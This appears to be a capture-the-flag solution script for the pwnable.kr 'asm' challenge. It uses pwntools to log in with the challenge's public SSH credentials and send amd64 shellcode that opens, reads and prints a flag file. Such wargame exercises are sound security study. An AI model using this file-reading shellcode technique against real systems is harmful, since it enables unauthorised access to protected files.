#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
import sys
context.log_level = "debug"
context.arch = 'amd64'
context.os = 'linux'

if sys.argv[1] == "l":
    io = process("./asm")
else:
    io = ssh(host = "pwnable.kr", user = "asm", password = "guest", port = 2222).connect_remote("localhost", 9026)

shellcode = shellcraft.pushstr("this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong")
shellcode += shellcraft.open("rsp")
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)

io.sendlineafter("shellcode: ", asm(shellcode))
print io.recv()
io.close()
